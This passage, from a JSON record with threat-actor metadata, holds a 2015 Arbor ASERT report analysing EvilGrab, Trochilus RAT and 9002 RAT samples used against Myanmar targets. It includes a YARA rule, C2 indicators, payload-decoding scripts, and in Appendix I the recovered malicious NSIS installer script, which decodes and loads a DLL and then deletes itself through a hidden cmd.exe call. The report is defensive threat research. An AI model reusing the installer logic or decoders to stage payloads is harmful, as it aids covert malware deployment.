touches disk, but is instead\ninjected into ctfmon.exe. Therefore, analysis of memory dumps for detection and classification may prove\nfruitful. The following YARA rule can be used to aid such investigations.\n\n// detects instances of EvilGrab aka Grabber malware.\n// Arbor Networks ASERT Nov 2015\n\nrule evilgrab\n{\n\nstrings:\n$str1 = \"%cload crypt32.dll error\"\n$str2 = \"Outlook2003_HTTP\"\n$str3 = \"Outlook2002_HTTP\"\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 15\n\n\n-----\n\n$str4 = \"HTTP Server URL\"\n$str5 = \"Outlook2003_IMAP\"\n$str6 = \"Outlook2002_IMAP\"\n$str7 = \"%cget %s 's password error!\"\n$str8 = \"GetTcpTable failed with %d\"\n$str9 = \"<Start Application 2 key>\"\n$str10 = \"<Browser Start and Home key>\"\n$str11 = \"%USERPROFILE%\\users.bin\"\n$str12 = \"%c%s|(%s)|%d|%s|%s|%s|%s|%s|%s|%s|%d|%d|%x|%x|%s|\"\n\ncondition:\n8 of them\n}\n\nThe file inside the RAR, IEChecker.exe, is a DLL file that contains a variety of obfuscation techniques including\ndynamic string reassembly for the loading of API calls. This sample matches indicators for the EvilGrab\nmalware mentioned by Palo Alto networks [2] but this file has a distinct hash. Incidentally, the threat actors\nand/or developer of the malware appear to have named it “Grabber” based on development strings found\ntherein. Others have called this malware “Tiger Shark RAT”.\n\nThe C2 information on this sample (dns[.]websecexp.com, ns[.]websecexp.com, appeur[.]gnway.cc), the\nmutex (New2010-V3-Uninstall), and the version (v2014-v05) are identical to elements observed in the\nmalware that was profiled by Palo Alto Networks. The Grabber sample also initiates unusual network\nconnections via an HTTP GET request:\n\n**_Figure 9:_** _Evilgrab/Grabber malware malformed HTTP beacon_\n\nItems of interest in this beacon include the presence of five extraneous bytes prior to the HTTP GET request.\nThese five bytes, plus the Host: header and the Accept-Language header of zh-cn and the unique Microsoft\nstring make for a solid network signature and an addition to YARA rules for malware hunting.\n\n16 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n**Sample #6: Trochilus RAT**\n\nSample #4 and #6 are both instances of the newly discovered Trochilus RAT.\n\n- MD5 (Update-Patch.rar) = 4e666c05656080180068f35cc7b026cb October 21, 2015\n\n     - MD5 (Setup.exe) = 9d04bd9a340eca1b92fe05755e9b349a\n\n     - MD5 (SqmApi.dll) = abef3efb5972cfe4abdc4a9c99f67f0e\n\n     - MD5 (plgus_res.dll) = 34dcfa1fa3e1573b2c401c195fb55833\n\n          - MD5 (shell.dll) = fb1d808c6d332fc8176cfa00a8325341\n\n          - MD5 (data.dat) = 15e16b0659d30e77f21807f779df0f4b\n\n**Trochilus RAT analysis (samples #4 and #6)**\n\nSince sample #4 and #6 are very similar, we will dive deeper into an analysis of sample #4, the first instance of\nthe Trochilus RAT that we encountered, named Update-Patch0999999.rar. Analysis reveals potentially useful\ntimestamps of files inside the RAR - Setup.exe is from March 10, 2014 and the other two files are from\nSeptember 23, 2015.\n\n**_Figure 10:_** _Files from unpacked RAR of sample #4, Trochilus RAT_\n\n**_Figure 11:_** _Initial execution pop-up message_\n\nThe file Setup.exe is a signed binary that appears to be a part of a\nlegitimate Microsoft Security Essentials package\n(http://binarydb.com/soft/Microsoft-Security-Essentials-v327664/2)\nthat loads a legitimate binary named SqmApi.dll as part of normal\noperations (sqmapi is inside the binaries import table). When\nSetup.exe is executed, it quickly loads its own copy, in the local\ndirectory, of SqmApi.dll which then generates a popup labeled\n“success” that prints the string “update install success”. This pop-up\nmessage has been observed in several of the malware samples\ncontained in this set, and further drives home the “Update” theme of\nthe malware installation tactic that has been observed in filenames.\n\nThe SqmApi.dll file executes and generates the network connection to 222.222.222[.]222 on TCP/999 just\nafter generating the “update install success” pop-up message. Next, plgus_res.dll is loaded and executed with\nCreateProcessA as seen in the following two images.\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 17\n\n\n-----\n\n**_Figure 12:_** _SqmApi.dll generates pop-up and initiates network connection_\n\n**_Figure 13:_** _Execution of SqmApi.dll results in the loading and execution of the file plgus_res.dll._\n\n**_Figure 14:_** _Debugger illuminates the use of CreateProcessA to load plgus_res.dll_\n\n18 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\nPlgus_res.dll is actually a Trochilus RAT installation package created using the Nullsoft Installer (NSIS) format.\nExtracting the contents of plgus_res.dll with a specific version of 7zip (7z beta 9.38 in this case – later versions\ndid not properly extract every file) allows all of the files to be viewed, including the NSIS installation script\nitself, created by 7zip as [NSIS].nsi. Shell.dll and data.dat are both obfuscated files. Shell.dll is not an obvious\nPE file, having been obfuscated via an encoding scheme.\n\n**_Figure 15:_** _Files extracted from plgus_res.dll by 7zip reveal additional staging_\n\nOnce the package file plgus_res.dll is properly decrypted, injected into memory and executed, the malware\ngenerates an outbound connection over TCP/25.\n\n**_Figure 16:_** _Trochilus RAT outbound connection - obfuscated_\n\nIt is interesting to note that the first portion of binary data being sent from the compromised machine\ncontains the hex value 0x7e. Following this, a data packet containing 0x7e bytes is sent. In the screenshot\nobserved above, the network destination was no longer online. Therefore, traffic was redirected to a\nsimulated network in order to capture packets.\n\nThis malware attempted to evade sandbox analysis on several occasions, and was therefore coaxed to run\nmanually. The malicious code injects into services.exe. The volatility memory forensics framework malfind\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 19\n\n\n-----\n\nplugin was used by ASERT research to determine that services.exe had been tampered with and a memory\ndump of the malware was extracted. This malware therefore appears to run only in memory and does not\nleave a footprint on the disk, except in the form of encoded files that do not execute by themselves and are\nresistant to static file malware detection processes and static analysis.\n\nThe Shell.dll file is stored in an encoded manner, with the first 4095 bytes being subject to an XOR-based\nencoding scheme. The data.dat file was encoded in a very similar manner except the whole file was encoded.\nIn the case of shell.dll and other files recovered from within this batch of RAR files, a cursory analysis that\nincludes running the ‘strings’ tool over the binaries revealed some artifacts, yet many details (including PE\nheaders) were obfuscated in such a manner that static analysis tools will likely miss the malicious contents.\n\nThere are two important values that need to be obtained from the [NSIS].nsi file that correspond to variable\n$1 and variable $2 that are used in an NSIS Integer Operation (IntOp). To use the following script (provided by\nASERT) to decode other instances of shell.dll, the values 227 and 240 observed here will need to be replaced\nwith whatever values are present inside the [NSIS].nsi file for the IntOp $1 and IntOp $2 functions (see\nAppendix I for the full contents of a recovered [NSIS].nsi file).\n\nimport sys\n\nfp = open(sys.argv[1], \"rb\")\nenc_buf = fp.read()\nfp.close()\n\none = 227 # IntOp $1 227 + 0\ntwo = 240 # IntOp $2 240 + 0\nthree = 0\n\ni = 0\n\nplain = []\nfor enc_byte in enc_buf:\nif i > 4095:\nbreak\nthree = (one + two) % 255 # IntOp $3 $1 + $2 ; IntOp $3 $3 % 255\nprint \"xor key: 0x%x\" % three\n\nplain_byte = ord(enc_byte) ^ three # IntOp $R2 $R2 ^ $3\nplain.append(chr(plain_byte))\n\none = two # IntOp $1 $2 + 0\ntwo = three # IntOp $2 $3 + 0\n\ni += 1\n\ndecrypted = \"\".join(plain) + enc_buf[4096:]\n\nfp = open(sys.argv[1] + \".decrypted\", \"wb\")\nfp.write(\"\".join(decrypted))\nfp.close()\n\n20 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\nIn this case, the decoded file MD5 is 304d83e15cce9b8dc826cdee2a96ef62 and can more easily be analyzed\nwith IDA Pro or other static analysis tools.\n\nOnce clean binaries were extracted by the python script, artifacts revealed a connection to source code shared\nat https://github[.]com/5loyd/trochilus known as the Trochilus RAT. Trochilus is a character from Greek\nmythology that apparently invented the chariot, but the word also means “a kind of small bird” and can refer\nto several types of hummingbirds. A third meaning comes from architecture, however the exact meaning\nintended by the developer is unknown.\n\nThe NSIS script technique appears to be instrumented inside the builder for Trochilus, named Generator.exe.\nThe default parameters (3 and 5) for the second-layer encoding scheme used by Trochilus were observed in\nthis batch of samples, where the final payload was encoded inside data.dat by a routine called\nXorFibonacciCrypt. If the USE_ENCRYPTED_CORE token is enabled during the build, then this encoding routine\nis activated.\n\n**#ifdef USE_ENCRYPTED_CORE**\n**debugLog(_T(\"decrypt dll file\"));**\n**XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);**\n**#endif**\n\nThis code can be found in https://github[.]com/5loyd/trochilus/blob/master/client/servant/shell/Shell.cpp\n\nThe source code for Shell.dll can be found at\nhttps://github[.]com/5loyd/trochilus/tree/master/client/servant/shell\n\nVarious memory artifacts found from trochilus-master/client/servant/shell/SvtShell.cpp indicate that the\nthreat actors are at least using this portion of the code. Other artifacts were found from Shell.cpp in the same\ndirectory. For example, the data.dat file can be found referenced at\nhttps://github[.]com/5loyd/trochilus/tree/master/client/servant/body\n\nThe data.dat files built and encoded by Trochilus can be decoded using the following script:\n\nimport sys\n\nfp = open(sys.argv[1], \"rb\")\nenc_buf = fp.read()\nfp.close()\n\n# these are passed as arguments to the decrypt function\nkey_material_1 = 5\nkey_material_2 = 3\n\nplain = []\nfor enc_byte in enc_buf:\nxor_key = (key_material_2 + key_material_1) % 255\n\nplain_byte = ord(enc_byte) ^ xor_key\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 21\n\n\n-----\n\nplain.append(chr(plain_byte))\n\nkey_material_2 = key_material_1\nkey_material_1 = xor_key\n\nfp = open(sys.argv[1] + \".decrypted\", \"wb\")\nfp.write(\"\".join(plain))\nfp.close()\n\nhttps://github[.]com/5loyd/trochilus/blob/master/client/servant/body/common.cpp contains a routine called\nXorFibonacciCrypt that matches code observed inside the DLL and inside the NSIS package configuration:\n\nfor (DWORD i = 0; i < dwPlainLen; i++)\n{\nBYTE xorchar = (last1 + last2) % MAXBYTE;\nlast2 = last1;\nlast1 = xorchar;\n\nlpOutput = (lpSource) ^ xorchar;\nlpOutput ++;\nlpSource ++;\n}\n\n**_Figure 17:_** _Trochilus RAT readme file describes basic capabilities_\n\nObtaining the source to the malware provided\nmany insights, including the fundamental\nREADME that describes the basic functionality of\nthe RAT (observed in Figure 17). Other\nresearchers and analysts who wish to obtain\nadditional insight should download the code for\nfurther analysis.\n\n22 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\nAfter compiling the source code, the client builder for the Trochilus RAT malware appears as such:\n\n**_Figure 18:_** _Trochilus RAT builder Generator.exe with Chinese -> English translations_\n\nThe builder application, named Generator.exe (MD5: 4710c9f5dc156db756dab7e017b0bdb3) provides an\noption for an IP address (default of 127.0.0.1) and an option to select HTTP, HTTPS, TCP, or UDP. The default\nport value for all settings is 8081, and the other values are -1. Generating the malware using the default\nsettings (as seen above) results in the creation of a generator.ini file, which provides at-a-glance insight into\nhow these values are used.\n\n**_Figure 19:_** _Sample Trochilus RAT INI file_\n\nA great number of additional insights into this\nmalware are available via the source code for those\nthat wish to perform further investigations. Suffice it\nto say that this malware is being used in targeted\nthreat operations and deserves additional attention.\n\nIt is currently unknown if 5loyd (aka floyd419, using\nmail floyd419[@]foxmail.com) has any connection to\nthreat actors involved, or is simply providing code\nthat others have used. Several watchers of 5loyd\ncode on github also provide interesting code\nprojects that could be used in advanced campaigns.\n5loyd has also contributed to a Windows credential\ndumping application known as quarkspwdump that\nmay be of interest to advanced threat researchers.\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 23\n\n\n-----\n\n**_Figure 20:_** _Github page for 5loyd where the trochilus RAT code is published_\n\n**_Figure 21:_** _Forum avatar for a user named “floyd419”_\n\nThe bulk of development activity since the project was shared on github\ntook place between May and July of 2015. OSINT on the e-mail address\nassociated with 5loyd reveal a user named floyd419 that had posted on a\nChinese matlab forum [6]. Nothing further was obtained on this author at\nthis time, although a variety of other potentially interesting connections can\nbe observed.\n\n24 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\nAwareness of the Trochilus RAT seems very low, based on search inquiries. No results were returned in\nEnglish, however one hit was returned when searching the Chinese webspace [http://weisuo[.]org/?post=136]\nfrom a site calling itself Villiage Mudhorse (村里的-草泥马之家). The site discusses various TTPs of system\npenetration. The first user on the site (http://weisuo[.]org/?author=1), ‘c4bbage’ posted the contents of the\ngithub Trochilus page on May 23, 2015. While ‘c4bbage’ shows a strong interest in system penetration and\nrelated tools, there are no indications that ‘c4bbage’ is involved in the threat activity described herein.\nHowever the site likely helped more people learn about trochilus.\n\n**_Figure 22:_** _Posting about trochilus RAT on Chinese forum_\n\nInitial inspection suggests there may only be two users on this site, author 1 ‘c4bbage’ and author 3 ‘zcgonvh’.\nBrowsing the page of zcgonvh (http://weisuo[.]org/?author=3) reveals discussions about the China Chopper\nwebshell, known to be used by various Chinese APT actors. This page indicates that zcgonvh is the author of\nChina Chopper. A link to download China Chopper is also present on the site, but the code is inside a password\nprotected ZIP. Despite attempts to utilize the password provided on the page, the password was not accepted.\nThe link that discusses China Chopper is http://weisuo[.]org/?post=49. While this is an interesting bit of\ninformation that provides links to other Chinese APT tactics and tools, exploring this further connection is\nbeyond the scope of this document and is left as a future exercise.\n\nMuch more insight can be obtained via the source code, however the bottom line is that the Trochilus RAT\nappears to be relatively new and now that it has been discovered in the wild as part of targeted threat\ncampaign activity, defenders can operate with additional awareness.\n\n**Malware sample #7: 9002 RAT in Firefox Plugin**\n\nAn unprofiled instance of the 9002 RAT (3102 variant) was found inside a malicious Firefox plugin found at\nhttp://www.uecmyanmar[.]org/plugins/system/jatabs/jatabs/FlashVideoPlayer.php and was submitted to\nVirusTotal on August 21, 2015 from Japan and later on October 13 from Singapore. This file is no longer\npresent on the UEC website, but provides further insight into threat activity. While the RAT family and variant\nis the same as discussed by Citizen Lab, this is a distinct sample.\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 25\n\n\n-----\n\nFilename: FlashVideoPlayer.php\n\nMD5: fcd3bec917b1cc095c1f2b06a75c9412\n\nThe plugin is built inside a ZIP file construct and contains the following contents:\n\nMD5 (bootstrap.js) = bdd4b626ee6f2e15d7c3f80e7677003b\nMD5 (chrome.manifest) = 29f3da9349f67129dd66e245d5187b72\nMD5 (eZNSMZ8r.exe) = 666522db14a021d1e255cc28c9fd8721\nMD5 (install.rdf) = 010922d600054fe89cd1d98b53395d54\nMD5 (overlay.xul) = 7f0be0ea9075dda2b318082d14c2181d\n\nThe malware itself is the eZNSMZ8r.exe file, often misclassified as the Gamarue malware.\n\nThe bootstrap.js file references the EXE as follows:\n\nxpi_guid=\"{65d5c9ea-f5d6-e277-4254-ce58d766656e}\";payload_name=\"eZNSMZ8r.exe\";\n\nA user installing this Add-on would receive the following warning (when using a recent version of Firefox):\n\n**_Figure 23:_** _Malicious Firefox add-on notification indicates that the add-on is unverified_\n\nIgnoring the prompt results in the presence of a fake “Adobe Flash Player” in the Extensions list from within\nthe Firefox about:addons menu.\n\n26 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n**_Figure 24:_** _Artifacts left from unsuccessful installation of the malware_\n\nAccepting the risk and clicking on “Install” results in the spawning of two additional processes. One is the\naforementioned instance of the malicious binary named eZNSMZ8r.exe (running from\nC:\\Windows\\tasks\\eZNSMZ8r.exe), which launches another executable named Untitled.exe.\n\n**_Figure 25:_** _Execution path of the 3102 variant of the 9002 RAT_\n\nOnce the malware is successfully installed, there is no indication that an extension is active, as the\n“Extensions” list in Firefox does not reflect the presence of “Adobe Flash Player” (as seen above, from a nonsuccessful installation). Once Firefox is closed, the malware continues to execute.\n\nThe malware makes a DNS query for client.secvies[.]com, which as of this writing resolves to 123.1.181[.]38\nbut previously resolved to 103.240.203[.]100 from the time period of August 20-25 2015. Since this latter IP\naddress more closely corresponds with the timing scheme associated with the campaign, a review of other\nresolutions for this IP is of interest and reveals other PlugX activity taking place on the domain\ngoogletranslatione[.]com.\n\nA Full table of interesting domain resolutions for this IP and their timestamps is included herein:\n\nChinarrw[.]com 2015-11-17 11:16:18 2015-11-17 11:16:18\n7caitu[.]com 2015-11-10 18:38:03 2015-11-10 18:38:03\nwww.chinarrw[.]com 2015-11-05 19:13:37 2015-11-05 19:13:37\n7caitu[.]com 2015-10-29 07:22:22 2015-11-04 14:00:47\ngoogletranslatione[.]com 2015-08-04 09:39:46 2015-08-25 15:17:56 PlugX\nclient.secvies[.]com 2015-08-20 20:16:58 2015-08-25 05:02:28 EvilGrab (or other RAT)\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 27\n\n\n-----\n\nAs the malware executes, we see the telltale beacon of the 3102 variant of the 9002 RAT as it beacons to the\nC2, as well as an identifier being send of “UEC 21050816” which likely indicates the date and subject of\ninterest involved in the threat activity. Further into the C2 beacon packet we see information about the\ncompromised machine.\n\n**_Figure 26:_** _3102 variant of the 9002 RAT beaconing to C2 with identifier “UEC 20150816”_\n\n#### Recommendations\n\nMalware such as PlugX, the 9002 RAT, EvilGrab, and the newly discovered Trochilus RAT are in use in the wild\nand are likely providing actors with the tools they need to perform actions on objectives against their targets.\nBoth host and network monitoring processes should be put into place in order to detect these malware\nfamilies.\n\nWhile these malware families have clearly been used against other targets (with the exception of Trochilus\nwhich requires further research), organizations within and related to Myanmar, or those organizations\nassociated with the UNDP should be aware that they may have been (and may still be) a target and should\nremain alert to any past or future e-mail messages that might contain spearphish or exploit code in\nattachments. Due to spearphish delivery in other related campaigns, any mail messages or other content that\npoint users towards interactions with RAR files are also potentially suspicious. Additionally, an investigation\nshould be triggered when such organizations observe network traffic that relates the content described\nherein.\n\nIn general, incident responders and threat intelligence staff should be aware of geopolitical targeting that\naffects their interests and take appropriate actions. If log files containing malicious activity are available, they\ncan be leveraged to determine threat campaign activity. This allows responders to track spearphish attempts\nand other exploitation vectors from the source to any targeted systems. Ongoing access to strategic\ninformation is often the ultimate goal of threat actors. Determining what strategic information is of interest\ncan help organizations better pinpoint defensive technologies to detect compromise, thus limiting their\nexposure and exfiltration of sensitive data.\n\nArbor ASERT is interested in any artifacts from the use of these malware and encourages any customers or\nother organizations that have been targeted to contact us for additional discussions.\n\n28 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n**Appendix I: NSIS script used to unpack and process Trochilus RAT samples**\n\n; NSIS script NSIS-3\n; Install\n\nSetCompressor /SOLID lzma\nSetCompressorDictSize 8\n\n; -------------------; HEADER SIZE: 3976\n; START HEADER SIZE: 300\n; MAX STRING LENGTH: 1024\n; STRING CHARS: 898\n\nOutFile [NSIS].exe\n!include WinMessages.nsh\n\nSilentInstall silent\n\n; -------------------; LANG TABLES: 1\n; LANG STRINGS: 38\n\nName Test\nBrandingText \"Nullsoft Install System v3.0b2\"\n\n; LANG: 1033\nLangString LSTR_0 1033 \"Nullsoft Install System v3.0b2\"\nLangString LSTR_1 1033 \"$(LSTR_2) Setup\"\nLangString LSTR_2 1033 Test\nLangString LSTR_5 1033 \"Can't write: \"\nLangString LSTR_8 1033 \"Could not find symbol: \"\nLangString LSTR_9 1033 \"Could not load: \"\nLangString LSTR_17 1033 \"Error decompressing data! Corrupted installer?\"\nLangString LSTR_19 1033 \"ExecShell: \"\nLangString LSTR_21 1033 \"Extract: \"\nLangString LSTR_22 1033 \"Extract: error writing to file \"\nLangString LSTR_24 1033 \"No OLE for: \"\nLangString LSTR_25 1033 \"Output folder: \"\nLangString LSTR_29 1033 \"Skipped: \"\nLangString LSTR_30 1033 \"Copy Details To Clipboard\"\nLangString LSTR_36 1033 \"Error opening file for writing: $\\r$\\n$\\r$\\n$0$\\r$\\n$\\r$\\nClick Abort to stop the\ninstallation,$\\r$\\nRetry to try again, or$\\r$\\nIgnore to skip this file.\"\nLangString LSTR_37 1033 Custom\n\nInstType $(LSTR_37)  ; Custom\n; wininit = $WINDIR\\wininit.ini\n\n; -------------------\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 29\n\n\n-----\n\n; SECTIONS: 1\n; COMMANDS: 56\n\nSection RC ; Section_0\n; AddSize 362\nSectionIn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 RO\nStrCpy $R1 1024\nSystem::Call \"kernel32::ExpandEnvironmentStrings(t $\\\"%ALLUSERSPROFILE%\\WEventsCache$\\\",t .R1,i\n1024)\"\n; Call Initialize_____Plugins\n; SetOverwrite off\n; File $PLUGINSDIR\\System.dll\n; SetDetailsPrint lastused\n; Push \"kernel32::ExpandEnvironmentStrings(t $\\\"%ALLUSERSPROFILE%\\WEventsCache$\\\",t .R1,i 1024)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call\nStrCpy $INSTDIR $R1\nSetOutPath $INSTDIR\nSetOverwrite on\nFile shell.dll\nFile data.dat\nFileOpen $R1 $INSTDIR\\Shell.dll a\nIntOp $1 105 + 0\nIntOp $2 141 + 0\nIntOp $3 0 + 0\nStrCpy $R3 0\nGoto label_17\nlabel_16:\nIntOp $R3 $R3 + 1\nlabel_17:\nIntCmp $R3 4095 0 0 label_29\nIntOp $3 $1 + $2\nIntOp $3 $3 % 255\nFileReadByte $R1 $R2\nFileSeek $R1 -1 CUR\nIntOp $R2 $R2 ^ $3\nFileWriteByte $R1 $R2\nIntOp $1 $2 + 0\nIntOp $2 $3 + 0\nGoto label_16\nGoto label_16\nGoto label_29\nlabel_29:\nFileClose $R1\nSystem::Call \"$INSTDIR\\Shell.dll::Init(i 1)\"\n; Call Initialize_____Plugins\n; SetOverwrite off\n; AllowSkipFiles off\n; File $PLUGINSDIR\\System.dll\n; SetDetailsPrint lastused\n; Push \"$INSTDIR\\Shell.dll::Init(i 1)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call\nSystem::Call \"kernel32::GetModuleFileName(i 0,t .R1,i 1024)\"\n; Call Initialize_____Plugins\n; File $PLUGINSDIR\\System.dll\n\n30 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n; SetDetailsPrint lastused\n; Push \"kernel32::GetModuleFileName(i 0,t .R1,i 1024)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call\nExecShell open cmd.exe \"/c ping 127.0.0.1&del $\\\"$R1$\\\"\" SW_HIDE  ; \"open cmd.exe\"\nSectionEnd\n\n/*\nFunction Initialize_____Plugins\nSetDetailsPrint none\nStrCmp $PLUGINSDIR \"\" 0 label_52\nPush $0\nSetErrors\nGetTempFileName $0\nDelete $0\nCreateDirectory $0\nIfErrors label_53\nStrCpy $PLUGINSDIR $0\nPop $0\nlabel_52:\nReturn\n\nlabel_53:\nMessageBox MB_OK|MB_ICONSTOP \"Error! Can't initialize plug-ins directory. Please try again later.\" /SD IDOK\nQuit\nFunctionEnd\n*/\n\nNOTE: a possibly imperfect reconstruction of the NSIS script results in artifacts below.\n\n; -------------------; UNREFERENCED STRINGS:\n\n/*\n1 ProgramFilesDir\n17 CommonFilesDir\n32 \"C:\\Program Files\"\n49 $PROGRAMFILES\n53 \"$PROGRAMFILES\\Common Files\"\n70 $COMMONFILES\n*/\n\nSeveral interesting elements inside this script stand out. In particular, we see “SilentInstall silent” which likely\nmakes for an installation of the malware that provides no notification to the user. We see that threat actors\nhave used Nullsoft Install System v3.0b2, which was released on August 5, 2015 and provides for Windows 10\ninstallation support [http://sourceforge.net/p/nsis/news/2015/08/nsis-30b2-released/]. Therefore, we can\nknow that at least this package was designed after August 5, 2015. We can see from the config that the LZMA\ncompression option is used (SetCompressor /SOLID lzma) which apparently provides for higher compression\nrates. The /SOLID option compresses all of the installer data into one block, resulting in greater compression\nratios (and potentially further complicating static analysis and detection routines).\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 31\n\n\n-----\n\n#### References\n\n1. https://asert.arbornetworks.com/defending-the-white-elephant/\n2. http://researchcenter.paloaltonetworks.com/2015/06/evilgrab-delivered-by-watering-hole-attack-on\npresident-of-myanmars-website/\n3. https://citizenlab.org/2015/10/targeted-attacks-ngo-burma/\n4. http://pages.arbornetworks.com/rs/082-KNA\n087/images/ASERT%20Threat%20Intelligence%20Brief%20201505%20PlugX%20Threat%20Activity%20in%20Myanmar.pdf\n5. http://about-threats.trendmicro.com/cloud-content/us/ent-primers/pdf/2q-report-on-targeted\nattack-campaigns.pdf\n6. http://webcache.googleusercontent.com/search?q=cache:yZN1nJdkDD0J: www.ilovematlab.cn/space\nuid-896373.html+&cd=11&hl=en&ct=clnk&gl=us\n\n#### About ASERT\n\nThe Arbor Security Engineering & Response Team (ASERT) at Arbor Networks delivers world-class network\nsecurity research and analysis for the benefit of today's enterprise and network operators. ASERT engineers\nand researchers are part of an elite group of institutions that are referred to as “super remediators,” and\nrepresent the best in information security. This is a reflection of having both visibility and remediation\ncapabilities at a majority of service provider networks globally.\n\nASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response\nTeams (CERTs) and with thousands of network operators via intelligence briefs and security content feeds.\nASERT also operates the world1s largest distributed honeynet, actively monitoring Internet threats around the\nclock and around the globe via ATLAS®, Arbor's global network of sensors: http://atlas.arbor.net. This mission\nand the associated resources that Arbor Networks brings to bear to the problem of global Internet security is\nan impetus for innovation and research.\n\nTo view the latest research, news, and trends from Arbor, ASERT and the information security community at\nlarge, visit our Threat Portal at http://www.arbornetworks.com/threats/.\n\n32 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/z1uanuv1vn3vw5iket1r6bqrmlra0gpn"
    ],
    "report_names": [
        "Arbor_Uncovering-the-Seven-Pointed-Dagger(Jan-11-16)"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ee075ea8-abe6-4f16-ab37-127dfac6f7fd",
            "created_at": "2023-01-06T13:46:38.334217Z",
            "updated_at": "2025-03-27T02:00:02.807589Z",
            "deleted_at": null,
            "main_name": "APT.3102",
            "aliases": [],
            "source_name": "MISPGALAXY:APT.3102",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "699b7efc-322d-489d-818d-823fac028124",
            "created_at": "2023-01-06T13:46:39.404825Z",
            "updated_at": "2025-03-27T02:00:03.07918Z",
            "deleted_at": null,
            "main_name": "APT9",
            "aliases": [
                "NIGHTSHADE PANDA",
                "Red Pegasus",
                "Group 27"
            ],
            "source_name": "MISPGALAXY:APT9",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e79324a2-bdae-4dc5-9421-578a59045288",
            "created_at": "2022-10-25T16:07:23.906087Z",
            "updated_at": "2025-03-27T02:02:10.022303Z",
            "deleted_at": null,
            "main_name": "Nightshade Panda",
            "aliases": [
                "APT 9",
                "FlowerLady",
                "FlowerShow",
                "Group 27",
                "Nightshade Panda",
                "Operation Seven Pointed Dagger"
            ],
            "source_name": "ETDA:Nightshade Panda",
            "tools": [
                "3102 RAT",
                "9002 RAT",
                "Agent.dhwf",
                "BKDR_EVILOGE",
                "BKDR_HGDER",
                "BKDR_NVICM",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "EvilGrab",
                "EvilGrab RAT",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "HidraQ",
                "Homux",
                "Hydraq",
                "Kaba",
                "Korplug",
                "McRAT",
                "MdmBot",
                "MoonWind",
                "MoonWind RAT",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "Vidgrab",
                "Wmonder",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1450703187,
    "ts_modification_date": 1450703187,
    "files": {
        "pdf": "https://archive.orkl.eu/37584381a0a0c2d566b8ce13965ffa7226cdaa71.pdf",
        "text": "https://archive.orkl.eu/37584381a0a0c2d566b8ce13965ffa7226cdaa71.txt",
        "img": "https://archive.orkl.eu/37584381a0a0c2d566b8ce13965ffa7226cdaa71.jpg"
    }
}